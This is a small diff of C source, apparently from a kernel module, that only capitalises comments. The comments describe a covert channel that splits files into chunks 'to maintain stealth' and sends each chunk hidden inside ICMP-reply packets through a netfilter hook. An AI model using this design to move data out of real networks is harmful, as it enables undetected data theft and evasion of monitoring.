@@ -29,9 +29,9 @@ static const char DEFAULT_NEW_FILE_SIGNATURE[] = { 0xDE, 0xAD, 0xBE, 0xEF,
                                                    0xDE, 0xAD, 0xBE, 0xEF };
 
 /**
- * struct for storing file's signature.
- * each file sent by the module is marked by this struct, which contains the file
- * size and a unique signature. this struct will then be used when parsing the ICMP 
+ * Struct for storing file's signature.
+ * Each file sent by the module is marked by this struct, which contains the file
+ * size and a unique signature. This struct will then be used when parsing the ICMP 
  * packets to differentiate between the sent files.
  */
 struct new_file_signature {
@@ -41,8 +41,8 @@ struct new_file_signature {
 };
 
 /**
- * struct for storing chunks.
- * in order to maximize on performance and to maintain stealth, each file is splitted
+ * Struct for storing chunks.
+ * In order to maximize on performance and to maintain stealth, each file is splitted
  * to chunks, each chunk limited by the size DEFAULT_PAYLOAD_CHUNKS_SIZE.
  * get_payload is the function responsible for handing the chunks to the netfilter 
  * hook, where each chunk will be sent on top of a single ICMP-reply packet.
